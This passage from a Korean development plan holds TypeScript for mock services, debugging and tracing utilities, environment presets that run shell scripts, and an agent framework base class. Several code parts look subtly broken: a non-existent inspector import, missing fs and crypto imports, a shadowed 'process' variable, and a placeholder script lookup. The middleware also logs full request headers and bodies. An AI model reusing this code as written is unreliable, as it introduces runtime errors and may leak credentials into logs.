    this.mockServers.clear();
    this.mockData.clear();
  }
}

// WebSocket 모킹
export class WebSocketMockServer {
  private io: Server;
  
  constructor(httpServer: any) {
    this.io = new Server(httpServer, {
      cors: {
        origin: '*',
        methods: ['GET', 'POST']
      }
    });
    
    this.setupHandlers();
  }
  
  private setupHandlers(): void {
    this.io.on('connection', (socket) => {
      console.log('Mock WebSocket client connected');
      
      // 프로젝트 상태 업데이트 시뮬레이션
      this.simulateProjectUpdates(socket);
      
      // 에이전트 실행 상태 시뮬레이션
      this.simulateAgentExecutions(socket);
      
      socket.on('disconnect', () => {
        console.log('Mock WebSocket client disconnected');
      });
    });
  }
  
  private simulateProjectUpdates(socket: any): void {
    const projectId = `proj_${faker.string.uuid()}`;
    const statuses = ['analyzing', 'designing', 'building', 'testing', 'completed'];
    let currentIndex = 0;
    
    const interval = setInterval(() => {
      if (currentIndex >= statuses.length) {
        clearInterval(interval);
        return;
      }
      
      socket.emit('project:update', {
        projectId,
        status: statuses[currentIndex],
        progress: (currentIndex + 1) / statuses.length * 100,
        timestamp: new Date().toISOString()
      });
      
      currentIndex++;
    }, 3000);
  }
  
  private simulateAgentExecutions(socket: any): void {
    const agents = [
      'nl-input', 'ui-selection', 'parsing', 'component-decision',
      'matching-rate', 'search', 'generation', 'assembly', 'download'
    ];
    
    agents.forEach((agent, index) => {
      setTimeout(() => {
        socket.emit('agent:start', {
          agentName: agent,
          timestamp: new Date().toISOString()
        });
        
        setTimeout(() => {
          socket.emit('agent:complete', {
            agentName: agent,
            result: 'success',
            duration: faker.number.int({ min: 1000, max: 5000 }),
            timestamp: new Date().toISOString()
          });
        }, faker.number.int({ min: 2000, max: 8000 }));
      }, index * 2000);
    });
  }
}

// 모킹 설정
export const mockConfig = {
  enabled: process.env.USE_MOCKS === 'true',
  services: {
    bedrock: process.env.MOCK_BEDROCK === 'true',
    dynamodb: process.env.MOCK_DYNAMODB === 'true',
    s3: process.env.MOCK_S3 === 'true',
    external: process.env.MOCK_EXTERNAL_APIS === 'true'
  },
  endpoints: {
    bedrock: 'http://localhost:4567',
    dynamodb: 'http://localhost:8000',
    s3: 'http://localhost:4568',
    npm: 'http://localhost:4569/npm',
    github: 'http://localhost:4569/github',
    pypi: 'http://localhost:4569/pypi'
  }
};
```
---

### SubTask 0.12.4: 디버깅 도구 통합
**목표**: 효율적인 디버깅을 위한 도구 및 설정

**구현 내용**:
```typescript
// backend/src/dev/debugging-tools.ts
import { InspectorSession } from 'inspector';
import { performance } from 'perf_hooks';
import { AsyncLocalStorage } from 'async_hooks';
import util from 'util';
import chalk from 'chalk';

// 트레이스 컨텍스트 관리
export const traceContext = new AsyncLocalStorage<TraceContext>();

interface TraceContext {
  traceId: string;
  spanId: string;
  parentSpanId?: string;
  startTime: number;
  metadata: Record<string, any>;
}

// 고급 디버거
export class AdvancedDebugger {
  private session: InspectorSession;
  private breakpoints: Map<string, Breakpoint> = new Map();
  private profiles: Map<string, any> = new Map();
  
  constructor() {
    this.session = new InspectorSession();
    this.session.connect();
  }
  
  // 조건부 브레이크포인트 설정
  async setConditionalBreakpoint(
    file: string,
    line: number,
    condition: string,
    logMessage?: string
  ): Promise<void> {
    const scriptId = await this.getScriptId(file);
    
    await this.post('Debugger.setBreakpoint', {
      location: {
        scriptId,
        lineNumber: line - 1
      },
      condition
    });
    
    this.breakpoints.set(`${file}:${line}`, {
      file,
      line,
      condition,
      logMessage,
      hitCount: 0
    });
    
    if (logMessage) {
      // 로그 브레이크포인트
      await this.post('Runtime.addBinding', {
        name: 'logpoint',
        executionContextId: 1
      });
    }
  }
  
  // 성능 프로파일링 시작
  async startProfiling(profileName: string): Promise<void> {
    await this.post('Profiler.enable');
    await this.post('Profiler.start');
    
    this.profiles.set(profileName, {
      startTime: Date.now(),
      name: profileName
    });
  }
  
  // 성능 프로파일링 중지
  async stopProfiling(profileName: string): Promise<CPUProfile> {
    const result = await this.post('Profiler.stop');
    await this.post('Profiler.disable');
    
    const profile = this.profiles.get(profileName);
    if (profile) {
      profile.endTime = Date.now();
      profile.data = result.profile;
    }
    
    return this.analyzeCPUProfile(result.profile);
  }
  
  // 메모리 스냅샷
  async takeHeapSnapshot(tag?: string): Promise<string> {
    await this.post('HeapProfiler.enable');
    
    const chunks: string[] = [];
    
    this.session.on('HeapProfiler.addHeapSnapshotChunk', (message) => {
      chunks.push(message.params.chunk);
    });
    
    await this.post('HeapProfiler.takeHeapSnapshot', {
      reportProgress: true,
      treatGlobalObjectsAsRoots: true
    });
    
    await this.post('HeapProfiler.disable');
    
    const snapshot = chunks.join('');
    const filename = `heapsnapshot-${tag || Date.now()}.json`;
    
    await fs.writeFile(filename, snapshot);
    
    return filename;
  }
  
  // 비동기 스택 트레이스 활성화
  async enableAsyncStackTraces(): Promise<void> {
    await this.post('Debugger.enable');
    await this.post('Debugger.setAsyncCallStackDepth', { maxDepth: 32 });
  }
  
  // 런타임 평가
  async evaluate(expression: string, contextId?: number): Promise<any> {
    const result = await this.post('Runtime.evaluate', {
      expression,
      generatePreview: true,
      includeCommandLineAPI: true,
      contextId
    });
    
    if (result.exceptionDetails) {
      throw new Error(result.exceptionDetails.text);
    }
    
    return result.result.value;
  }
  
  // CPU 프로파일 분석
  private analyzeCPUProfile(profile: any): CPUProfile {
    const nodes = new Map<number, any>();
    let totalTime = 0;
    
    // 노드 맵 생성
    profile.nodes.forEach((node: any) => {
      nodes.set(node.id, {
        ...node,
        selfTime: 0,
        totalTime: 0,
        children: []
      });
    });
    
    // 부모-자식 관계 설정
    profile.nodes.forEach((node: any) => {
      if (node.parent) {
        const parent = nodes.get(node.parent);
        if (parent) {
          parent.children.push(node.id);
        }
      }
    });
    
    // 시간 계산
    if (profile.samples && profile.timeDeltas) {
      let currentTime = profile.startTime;
      
      profile.samples.forEach((sample: number, index: number) => {
        const node = nodes.get(sample);
        if (node) {
          const delta = profile.timeDeltas[index];
          node.selfTime += delta;
          totalTime += delta;
          
          // 부모 노드들의 totalTime 업데이트
          let current = node;
          while (current) {
            current.totalTime += delta;
            current = nodes.get(current.parent);
          }
        }
        
        currentTime += profile.timeDeltas[index];
      });
    }
    
    // 핫스팟 찾기
    const hotspots = Array.from(nodes.values())
      .filter(node => node.selfTime > 0)
      .sort((a, b) => b.selfTime - a.selfTime)
      .slice(0, 10)
      .map(node => ({
        functionName: node.callFrame.functionName || '(anonymous)',
        url: node.callFrame.url,
        lineNumber: node.callFrame.lineNumber,
        selfTime: node.selfTime,
        totalTime: node.totalTime,
        percentage: (node.selfTime / totalTime) * 100
      }));
    
    return {
      totalTime,
      hotspots,
      profile
    };
  }
  
  // Inspector 세션 명령 실행
  private post(method: string, params?: any): Promise<any> {
    return new Promise((resolve, reject) => {
      this.session.post(method, params, (err, result) => {
        if (err) reject(err);
        else resolve(result);
      });
    });
  }
  
  // 스크립트 ID 가져오기
  private async getScriptId(filename: string): Promise<string> {
    const result = await this.post('Debugger.enable');
    // 실제 구현에서는 스크립트 목록에서 파일명으로 검색
    return '1'; // 임시
  }
}

// 실행 추적기
export class ExecutionTracer {
  private traces: Map<string, Trace[]> = new Map();
  
  // 함수 추적 데코레이터
  trace(options: TraceOptions = {}) {
    return (target: any, propertyKey: string, descriptor: PropertyDescriptor) => {
      const originalMethod = descriptor.value;
      
      descriptor.value = async function(...args: any[]) {
        const traceId = traceContext.getStore()?.traceId || generateTraceId();
        const spanId = generateSpanId();
        const startTime = performance.now();
        
        const trace: Trace = {
          traceId,
          spanId,
          method: `${target.constructor.name}.${propertyKey}`,
          args: options.logArgs ? args : undefined,
          startTime,
          metadata: {}
        };
        
        // 추적 시작
        if (options.log) {
          console.log(chalk.blue(`→ ${trace.method}`), {
            traceId,
            spanId,
            args: options.logArgs ? args : '[hidden]'
          });
        }
        
        try {
          // 컨텍스트 설정
          const result = await traceContext.run(
            {
              traceId,
              spanId,
              parentSpanId: traceContext.getStore()?.spanId,
              startTime,
              metadata: {}
            },
            async () => await originalMethod.apply(this, args)
          );
          
          trace.endTime = performance.now();
          trace.duration = trace.endTime - trace.startTime;
          trace.result = options.logResult ? result : undefined;
          trace.success = true;
          
          // 추적 완료
          if (options.log) {
            console.log(
              chalk.green(`← ${trace.method}`),
              chalk.gray(`(${trace.duration.toFixed(2)}ms)`),
              {
                traceId,
                spanId,
                result: options.logResult ? result : '[hidden]'
              }
            );
          }
          
          return result;
          
        } catch (error) {
          trace.endTime = performance.now();
          trace.duration = trace.endTime - trace.startTime;
          trace.error = error;
          trace.success = false;
          
          // 에러 추적
          if (options.log) {
            console.log(
              chalk.red(`✗ ${trace.method}`),
              chalk.gray(`(${trace.duration.toFixed(2)}ms)`),
              {
                traceId,
                spanId,
                error: error.message
              }
            );
          }
          
          throw error;
          
        } finally {
          // 추적 저장
          this.saveTrace(trace);
        }
      };
      
      return descriptor;
    };
  }
  
  // 수동 추적
  async traceExecution<T>(
    name: string,
    fn: () => Promise<T>,
    metadata?: Record<string, any>
  ): Promise<T> {
    const traceId = traceContext.getStore()?.traceId || generateTraceId();
    const spanId = generateSpanId();
    const startTime = performance.now();
    
    console.log(chalk.blue(`→ ${name}`), { traceId, spanId });
    
    try {
      const result = await traceContext.run(
        {
          traceId,
          spanId,
          parentSpanId: traceContext.getStore()?.spanId,
          startTime,
          metadata: metadata || {}
        },
        fn
      );
      
      const duration = performance.now() - startTime;
      console.log(
        chalk.green(`← ${name}`),
        chalk.gray(`(${duration.toFixed(2)}ms)`)
      );
      
      return result;
      
    } catch (error) {
      const duration = performance.now() - startTime;
      console.log(
        chalk.red(`✗ ${name}`),
        chalk.gray(`(${duration.toFixed(2)}ms)`),
        error
      );
      throw error;
    }
  }
  
  // 추적 저장
  private saveTrace(trace: Trace): void {
    if (!this.traces.has(trace.traceId)) {
      this.traces.set(trace.traceId, []);
    }
    
    this.traces.get(trace.traceId)!.push(trace);
  }
  
  // 추적 조회
  getTrace(traceId: string): Trace[] | undefined {
    return this.traces.get(traceId);
  }
  
  // 추적 시각화
  visualizeTrace(traceId: string): string {
    const traces = this.getTrace(traceId);
    if (!traces) return 'Trace not found';
    
    const sorted = traces.sort((a, b) => a.startTime - b.startTime);
    const lines: string[] = [''];
    
    sorted.forEach((trace, index) => {
      const indent = '  '.repeat(trace.metadata.depth || 0);
      const duration = trace.duration?.toFixed(2) || '?';
      const status = trace.success ? '✓' : '✗';
      
      lines.push(
        `${indent}${status} ${trace.method} (${duration}ms)`
      );
    });
    
    return lines.join('\n');
  }
}

// 향상된 콘솔 로깅
export class EnhancedConsole {
  private originalConsole = { ...console };
  
  install(): void {
    // console.log 오버라이드
    console.log = (...args: any[]) => {
      const enhanced = this.enhance(args);
      this.originalConsole.log(...enhanced);
    };
    
    // console.error 오버라이드
    console.error = (...args: any[]) => {
      const enhanced = this.enhance(args, 'error');
      this.originalConsole.error(...enhanced);
    };
    
    // console.table 개선
    const originalTable = console.table;
    console.table = (data: any, columns?: string[]) => {
      if (typeof data === 'object' && data !== null) {
        // 더 나은 포맷팅
        this.originalConsole.log(chalk.cyan('┌─ Table ─────────────────────┐'));
        originalTable.call(console, data, columns);
        this.originalConsole.log(chalk.cyan('└─────────────────────────────┘'));
      } else {
        originalTable.call(console, data, columns);
      }
    };
  }
  
  private enhance(args: any[], type: string = 'log'): any[] {
    const ctx = traceContext.getStore();
    const timestamp = new Date().toISOString();
    
    // 컬러 및 포맷팅
    const prefix = type === 'error' 
      ? chalk.red(`[${timestamp}]`)
      : chalk.gray(`[${timestamp}]`);
    
    // 트레이스 정보 추가
    const traceInfo = ctx 
      ? chalk.dim(`[${ctx.traceId.slice(0, 8)}/${ctx.spanId.slice(0, 8)}]`)
      : '';
    
    // 객체 깊은 검사
    const enhanced = args.map(arg => {
      if (typeof arg === 'object' && arg !== null) {
        return util.inspect(arg, {
          colors: true,
          depth: 4,
          maxArrayLength: 100,
          breakLength: 80,
          compact: false
        });
      }
      return arg;
    });
    
    return [prefix, traceInfo, ...enhanced];
  }
}

// 디버그 프록시
export function createDebugProxy<T extends object>(
  target: T,
  name: string = 'Object'
): T {
  return new Proxy(target, {
    get(obj, prop, receiver) {
      const value = Reflect.get(obj, prop, receiver);
      console.log(chalk.yellow(`[Proxy:${name}] GET`), prop, '→', value);
      return value;
    },
    
    set(obj, prop, value, receiver) {
      console.log(chalk.yellow(`[Proxy:${name}] SET`), prop, '←', value);
      return Reflect.set(obj, prop, value, receiver);
    },
    
    deleteProperty(obj, prop) {
      console.log(chalk.yellow(`[Proxy:${name}] DELETE`), prop);
      return Reflect.deleteProperty(obj, prop);
    },
    
    has(obj, prop) {
      const exists = Reflect.has(obj, prop);
      console.log(chalk.yellow(`[Proxy:${name}] HAS`), prop, '→', exists);
      return exists;
    }
  });
}

// 타입 정의
interface Breakpoint {
  file: string;
  line: number;
  condition?: string;
  logMessage?: string;
  hitCount: number;
}

interface CPUProfile {
  totalTime: number;
  hotspots: Array<{
    functionName: string;
    url: string;
    lineNumber: number;
    selfTime: number;
    totalTime: number;
    percentage: number;
  }>;
  profile: any;
}

interface TraceOptions {
  log?: boolean;
  logArgs?: boolean;
  logResult?: boolean;
}

interface Trace {
  traceId: string;
  spanId: string;
  method: string;
  args?: any[];
  result?: any;
  error?: any;
  startTime: number;
  endTime?: number;
  duration?: number;
  success?: boolean;
  metadata: Record<string, any>;
}

// 유틸리티 함수
function generateTraceId(): string {
  return crypto.randomBytes(16).toString('hex');
}

function generateSpanId(): string {
  return crypto.randomBytes(8).toString('hex');
}

// 디버깅 미들웨어
export function debuggingMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const traceId = req.headers['x-trace-id'] as string || generateTraceId();
    const spanId = generateSpanId();
    
    // 요청 로깅
    console.log(chalk.blue('→ HTTP Request'), {
      method: req.method,
      path: req.path,
      traceId,
      spanId,
      headers: req.headers,
      body: req.body
    });
    
    // 트레이스 컨텍스트 설정
    traceContext.run(
      {
        traceId,
        spanId,
        startTime: Date.now(),
        metadata: {
          method: req.method,
          path: req.path
        }
      },
      () => {
        // 응답 로깅
        const originalSend = res.send;
        res.send = function(data: any) {
          console.log(chalk.green('← HTTP Response'), {
            traceId,
            spanId,
            statusCode: res.statusCode,
            body: data
          });
          
          return originalSend.call(this, data);
        };
        
        next();
      }
    );
  };
}
```

### SubTask 0.12.5: 개발 환경 프리셋 관리
**목표**: 다양한 개발 시나리오를 위한 환경 프리셋

**구현 내용**:
```typescript
// backend/src/dev/environment-presets.ts
import { promises as fs } from 'fs';
import path from 'path';
import yaml from 'js-yaml';
import dotenv from 'dotenv';

// 환경 프리셋 매니저
export class EnvironmentPresetManager {
  private presets: Map<string, EnvironmentPreset> = new Map();
  private currentPreset?: string;
  
  constructor(private presetsDir: string = './config/presets') {}
  
  // 프리셋 로드
  async loadPresets(): Promise<void> {
    const files = await fs.readdir(this.presetsDir);
    
    for (const file of files) {
      if (file.endsWith('.yaml') || file.endsWith('.yml')) {
        const content = await fs.readFile(
          path.join(this.presetsDir, file),
          'utf-8'
        );
        
        const preset = yaml.load(content) as EnvironmentPreset;
        const name = path.basename(file, path.extname(file));
        
        this.presets.set(name, preset);
        console.log(`📦 Loaded preset: ${name}`);
      }
    }
  }
  
  // 프리셋 활성화
  async activatePreset(name: string): Promise<void> {
    const preset = this.presets.get(name);
    if (!preset) {
      throw new Error(`Preset '${name}' not found`);
    }
    
    console.log(`🚀 Activating preset: ${name}`);
    
    // 환경 변수 설정
    await this.applyEnvironmentVariables(preset.env);
    
    // 서비스 시작
    await this.startServices(preset.services);
    
    // Mock 설정
    await this.configureMocks(preset.mocks);
    
    // 초기 데이터 설정
    await this.loadInitialData(preset.data);
    
    // 스크립트 실행
    await this.runScripts(preset.scripts?.setup);
    
    this.currentPreset = name;
    console.log(`✅ Preset '${name}' activated`);
  }
  
  // 프리셋 비활성화
  async deactivatePreset(): Promise<void> {
    if (!this.currentPreset) return;
    
    const preset = this.presets.get(this.currentPreset);
    if (!preset) return;
    
    console.log(`🛑 Deactivating preset: ${this.currentPreset}`);
    
    // 정리 스크립트 실행
    await this.runScripts(preset.scripts?.teardown);
    
    // 서비스 중지
    await this.stopServices(preset.services);
    
    this.currentPreset = undefined;
  }
  
  // 환경 변수 적용
  private async applyEnvironmentVariables(
    env?: Record<string, string | number | boolean>
  ): Promise<void> {
    if (!env) return;
    
    // 현재 환경 변수 백업
    const backup = { ...process.env };
    
    // 새 환경 변수 적용
    Object.entries(env).forEach(([key, value]) => {
      process.env[key] = String(value);
    });
    
    // .env 파일 업데이트
    const envPath = path.join(process.cwd(), '.env.preset');
    const envContent = Object.entries(env)
      .map(([key, value]) => `${key}=${value}`)
      .join('\n');
    
    await fs.writeFile(envPath, envContent);
    dotenv.config({ path: envPath, override: true });
  }
  
  // 서비스 시작
  private async startServices(services?: ServiceConfig[]): Promise<void> {
    if (!services) return;
    
    for (const service of services) {
      console.log(`🔧 Starting service: ${service.name}`);
      
      switch (service.type) {
        case 'docker':
          await this.startDockerService(service);
          break;
        case 'process':
          await this.startProcessService(service);
          break;
        case 'mock':
          await this.startMockService(service);
          break;
      }
    }
  }
  
  // Docker 서비스 시작
  private async startDockerService(service: ServiceConfig): Promise<void> {
    const { spawn } = require('child_process');
    
    const args = ['run', '--rm', '-d'];
    
    // 포트 매핑
    if (service.ports) {
      service.ports.forEach(port => {
        args.push('-p', port);
      });
    }
    
    // 환경 변수
    if (service.env) {
      Object.entries(service.env).forEach(([key, value]) => {
        args.push('-e', `${key}=${value}`);
      });
    }
    
    // 컨테이너 이름
    args.push('--name', `t-dev-${service.name}`);
    
    // 이미지
    args.push(service.image!);
    
    const docker = spawn('docker', args);
    
    docker.on('error', (error) => {
      console.error(`Failed to start ${service.name}:`, error);
    });
  }
  
  // 프로세스 서비스 시작
  private async startProcessService(service: ServiceConfig): Promise<void> {
    const { spawn } = require('child_process');
    
    const [command, ...args] = service.command!.split(' ');
    
    const process = spawn(command, args, {
      env: { ...process.env, ...service.env },
      cwd: service.cwd,
      detached: true
    });
    
    process.unref();
  }
  
  // Mock 서비스 시작
  private async startMockService(service: ServiceConfig): Promise<void> {
    const { MockServiceManager } = await import('./mock-system');
    const mockManager = new MockServiceManager();
    
    if (service.name === 'all') {
      await mockManager.startAll();
    } else {
      // 특정 서비스만 시작
      await mockManager[`start${service.name}Mock`]();
    }
  }
  
  // 서비스 중지
  private async stopServices(services?: ServiceConfig[]): Promise<void> {
    if (!services) return;
    
    for (const service of services) {
      console.log(`🛑 Stopping service: ${service.name}`);
      
      if (service.type === 'docker') {
        const { exec } = require('child_process');
        exec(`docker stop t-dev-${service.name}`);
      }
    }
  }
  
  // Mock 설정
  private async configureMocks(mocks?: MockConfig): Promise<void> {
    if (!mocks) return;
    
    // Mock 응답 설정
    if (mocks.responses) {
      // 실제 구현에서는 Mock 시스템에 응답 설정
    }
    
    // 지연 설정
    if (mocks.latency) {
      process.env.MOCK_LATENCY_MIN = String(mocks.latency.min);
      process.env.MOCK_LATENCY_MAX = String(mocks.latency.max);
    }
    
    // 에러 시뮬레이션
    if (mocks.errors) {
      process.env.MOCK_ERROR_RATE = String(mocks.errors.rate);
    }
  }
  
  // 초기 데이터 로드
  private async loadInitialData(data?: DataConfig): Promise<void> {
    if (!data) return;
    
    console.log('📊 Loading initial data...');
    
    // 파일에서 로드
    if (data.files) {
      for (const file of data.files) {
        const content = await fs.readFile(file, 'utf-8');
        const items = JSON.parse(content);
        
        // 데이터베이스에 삽입
        await this.insertData(data.target, items);
      }
    }
    
    // 생성기로 생성
    if (data.generators) {
      for (const generator of data.generators) {
        const { generateTestData } = await import('./test-data-generator');
        const items = await generateTestData(generator.type, generator.count);
        
        await this.insertData(data.target, items);
      }
    }
  }
  
  // 데이터 삽입
  private async insertData(target: string, items: any[]): Promise<void> {
    // 실제 구현에서는 DynamoDB 또는 다른 데이터베이스에 삽입
    console.log(`💾 Inserted ${items.length} items into ${target}`);
  }
  
  // 스크립트 실행
  private async runScripts(scripts?: string[]): Promise<void> {
    if (!scripts) return;
    
    for (const script of scripts) {
      console.log(`📜 Running script: ${script}`);
      
      const { exec } = require('child_process');
      const { promisify } = require('util');
      const execAsync = promisify(exec);
      
      try {
        const { stdout, stderr } = await execAsync(script);
        if (stdout) console.log(stdout);
        if (stderr) console.error(stderr);
      } catch (error) {
        console.error(`Script failed: ${script}`, error);
      }
    }
  }
  
  // 프리셋 목록
  listPresets(): PresetInfo[] {
    return Array.from(this.presets.entries()).map(([name, preset]) => ({
      name,
      description: preset.description,
      active: name === this.currentPreset
    }));
  }
  
  // 프리셋 생성
  async createPreset(name: string, config: EnvironmentPreset): Promise<void> {
    const filePath = path.join(this.presetsDir, `${name}.yaml`);
    const content = yaml.dump(config);
    
    await fs.writeFile(filePath, content);
    this.presets.set(name, config);
    
    console.log(`✅ Created preset: ${name}`);
  }
}

// 프리셋 타입 정의
interface EnvironmentPreset {
  name: string;
  description: string;
  env?: Record<string, string | number | boolean>;
  services?: ServiceConfig[];
  mocks?: MockConfig;
  data?: DataConfig;
  scripts?: {
    setup?: string[];
    teardown?: string[];
  };
}

interface ServiceConfig {
  name: string;
  type: 'docker' | 'process' | 'mock';
  image?: string;
  command?: string;
  ports?: string[];
  env?: Record<string, string>;
  cwd?: string;
}

interface MockConfig {
  enabled: boolean;
  services?: string[];
  responses?: Record<string, any>;
  latency?: {
    min: number;
    max: number;
  };
  errors?: {
    rate: number;
    types?: string[];
  };
}

interface DataConfig {
  target: string;
  files?: string[];
  generators?: Array<{
    type: string;
    count: number;
    options?: any;
  }>;
}

interface PresetInfo {
  name: string;
  description: string;
  active: boolean;
}

// 프리셋 예시
const examplePresets = {
  'minimal': {
    name: 'minimal',
    description: 'Minimal setup for quick development',
    env: {
      NODE_ENV: 'development',
      USE_MOCKS: false,
      LOG_LEVEL: 'debug'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000']
      }
    ]
  },
  
  'full-mocks': {
    name: 'full-mocks',
    description: 'All services mocked for offline development',
    env: {
      NODE_ENV: 'development',
      USE_MOCKS: true,
      MOCK_LATENCY: true
    },
    mocks: {
      enabled: true,
      services: ['bedrock', 'dynamodb', 's3', 'external'],
      latency: {
        min: 100,
        max: 500
      }
    },
    data: {
      target: 'dynamodb',
      generators: [
        { type: 'projects', count: 50 },
        { type: 'components', count: 200 }
      ]
    }
  },
  
  'integration-test': {
    name: 'integration-test',
    description: 'Environment for integration testing',
    env: {
      NODE_ENV: 'test',
      USE_MOCKS: true,
      LOG_LEVEL: 'error'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000']
      },
      {
        name: 'redis',
        type: 'docker',
        image: 'redis:7-alpine',
        ports: ['6379:6379']
      }
    ],
    scripts: {
      setup: [
        'npm run db:migrate:test',
        'npm run seed:test'
      ],
      teardown: [
        'npm run db:clean:test'
      ]
    }
  },
  
  'performance-test': {
    name: 'performance-test',
    description: 'Environment for performance testing',
    env: {
      NODE_ENV: 'production',
      USE_MOCKS: false,
      ENABLE_PROFILING: true,
      LOG_LEVEL: 'warn'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000'],
        env: {
          JAVA_OPTS: '-Xmx2048m'
        }
      }
    ],
    data: {
      target: 'dynamodb',
      generators: [
        { type: 'projects', count: 1000 },
        { type: 'components', count: 5000 }
      ]
    },
    scripts: {
      setup: [
        'npm run build',
        'npm run optimize'
      ]
    }
  }
};

// CLI 명령어
export function setupPresetCLI(program: any): void {
  const presetCmd = program
    .command('preset')
    .description('Manage development environment presets');
  
  presetCmd
    .command('list')
    .description('List available presets')
    .action(async () => {
      const manager = new EnvironmentPresetManager();
      await manager.loadPresets();
      
      const presets = manager.listPresets();
      console.table(presets);
    });
  
  presetCmd
    .command('activate <name>')
    .description('Activate a preset')
    .action(async (name: string) => {
      const manager = new EnvironmentPresetManager();
      await manager.loadPresets();
      await manager.activatePreset(name);
    });
  
  presetCmd
    .command('deactivate')
    .description('Deactivate current preset')
    .action(async () => {
      const manager = new EnvironmentPresetManager();
      await manager.deactivatePreset();
    });
  
  presetCmd
    .command('create <name>')
    .description('Create a new preset')
    .action(async (name: string) => {
      // 대화형 프리셋 생성
      const inquirer = require('inquirer');
      
      const answers = await inquirer.prompt([
        {
          type: 'input',
          name: 'description',
          message: 'Preset description:'
        },
        {
          type: 'checkbox',
          name: 'services',
          message: 'Select services:',
          choices: ['dynamodb', 'redis', 'elasticsearch', 'mocks']
        },
        {
          type: 'confirm',
          name: 'useMocks',
          message: 'Enable mocking?'
        }
      ]);
      
      const preset: EnvironmentPreset = {
        name,
        description: answers.description,
        env: {
          NODE_ENV: 'development',
          USE_MOCKS: answers.useMocks
        },
        services: answers.services.map((s: string) => ({
          name: s,
          type: s === 'mocks' ? 'mock' : 'docker',
          image: s === 'dynamodb' ? 'amazon/dynamodb-local' :
                 s === 'redis' ? 'redis:7-alpine' :
                 s === 'elasticsearch' ? 'elasticsearch:8.11.0' : undefined
        }))
      };
      
      const manager = new EnvironmentPresetManager();
      await manager.createPreset(name, preset);
    });
}
```

**🔧 사용자 작업**:
- 프리셋 디렉토리 생성: `mkdir -p config/presets`
- 기본 프리셋 YAML 파일 생성
- 개발 시나리오별 프리셋 구성
- `npm run dev:preset minimal` 같은 스크립트 추가

---

## Task 0.13: 에이전트 개발 환경 설정

### SubTask 0.13.1: 에이전트 프레임워크 기초 설정
**목표**: 9개 핵심 에이전트 개발을 위한 기본 프레임워크 구성

**구현 내용**:
```typescript
// backend/src/agents/framework/base-agent.ts
import { EventEmitter } from 'events';
import { v4 as uuidv4 } from 'uuid';
import { Logger } from 'winston';
import { metrics } from '../../utils/monitoring';

export interface AgentContext {
  projectId: string;
  userId: string;
  sessionId: string;
  parentAgent?: string;
  metadata: Record<string, any>;
}

export interface AgentMessage {
  id: string;
  type: 'request' | 'response' | 'event' | 'error';
  source: string;
  target: string;
  payload: any;
  timestamp: Date;
  correlationId?: string;
}

export interface AgentCapability {
  name: string;
  description: string;
  inputSchema: any;
  outputSchema: any;
  version: string;
}

export abstract class BaseAgent extends EventEmitter {
  protected readonly id: string;
  protected readonly name: string;
  protected readonly version: string;
  protected readonly logger: Logger;
  protected context?: AgentContext;
  protected capabilities: Map<string, AgentCapability> = new Map();
  protected status: 'idle' | 'busy' | 'error' = 'idle';
  protected metrics: any;
  
  constructor(
    name: string,
    version: string,
    logger: Logger
  ) {
    super();
    this.id = `${name}-${uuidv4()}`;
    this.name = name;
    this.version = version;
    this.logger = logger;
    this.metrics = metrics;
    
    this.initialize();
  }
  
  protected abstract initialize(): void;
  protected abstract process(message: AgentMessage): Promise<any>;
  
  // 에이전트 생명주기 메서드
  async start(context: AgentContext): Promise<void> {
    this.context = context;
    this.status = 'idle';
    
    this.logger.info(`Agent ${this.name} started`, {
      agentId: this.id,
      context
    });
    
    this.metrics.increment('agent.started', 1, [`agent:${this.name}`]);
    this.emit('started', { agentId: this.id, context });
    
    await this.onStart();
  }
  
  async stop(): Promise<void> {
    this.status = 'idle';
    
    this.logger.info(`Agent ${this.name} stopped`, {
      agentId: this.id
    });
    
    this.metrics.increment('agent.stopped', 1, [`agent:${this.name}`]);
    this.emit('stopped', { agentId: this.id });
    
    await this.onStop();
  }
  
  // 메시지 처리
  async handleMessage(message: AgentMessage): Promise<AgentMessage> {
    const startTime = Date.now();
    this.status = 'busy';
    
    try {
      this.logger.debug(`Agent ${this.name} processing message`, {
        agentId: this.id,
        messageId: message.id,
        type: message.type
      });
      
      const result = await this.process(message);
      
      const response: AgentMessage = {
        id: uuidv4(),
        type: 'response',
        source: this.id,
        target: message.source,
        payload: result,
        timestamp: new Date(),
        correlationId: message.id
      };
      
      this.metrics.timing('agent.processing_time', Date.now() - startTime, [
        `agent:${this.name}`,
        `message_type:${message.type}`
      ]);
      
      this.status = 'idle';
      return response;
      
    } catch (error) {
      this.status = 'error';
      this.logger.error(`Agent ${this.name} error`, {
        agentId: this.id,
        messageId: message.id,
        error
      });
      
      this.metrics.increment('agent.errors', 1, [`agent:${this.name}`]);
      
      return {
        id: uuidv4(),
        type: 'error',
        source: this.id,
        target: message.source,
        payload: { error: error.message },
        timestamp: new Date(),
        correlationId: message.id
      };
    }
  }
  
  // 능력(Capability) 관리
  registerCapability(capability: AgentCapability): void {
    this.capabilities.set(capability.name, capability);
    this.logger.info(`Capability registered: ${capability.name}`, {
      agentId: this.id,
      capability
    });
  }
  
  getCapabilities(): AgentCapability[] {
    return Array.from(this.capabilities.values());
  }
  
  // 상태 관리
  getStatus(): string {
    return this.status;
  }
  
  getMetrics(): any {
    return {
      agentId: this.id,
      name: this.name,
      status: this.status,
      capabilities: this.getCapabilities().length
    };
  }
  
  // Hook 메서드들 (하위 클래스에서 구현)
  protected async onStart(): Promise<void> {}
  protected async onStop(): Promise<void> {}
}
```

### SubTask 0.13.2: 에이전트 통신 프로토콜 설정
**목표**: 에이전트 간 효율적인 통신을 위한 프로토콜 정의

**구현 내용**:
```typescript
// backend/src/agents/framework/communication.ts
import { EventEmitter } from 'events';
import Redis from 'ioredis';
import { AgentMessage } from './base-agent';

export interface MessageBus {
  publish(channel: string, message: AgentMessage): Promise<void>;
  subscribe(channel: string, handler: (message: AgentMessage) => void): void;
  unsubscribe(channel: string): void;
}

// Redis 기반 메시지 버스
export class RedisMessageBus implements MessageBus {
  private publisher: Redis;
  private subscriber: Redis;
  private handlers: Map<string, Set<(message: AgentMessage) => void>> = new Map();
  
  constructor(redisUrl: string) {
    this.publisher = new Redis(redisUrl);
    this.subscriber = new Redis(redisUrl);
    
    this.subscriber.on('message', (channel, data) => {
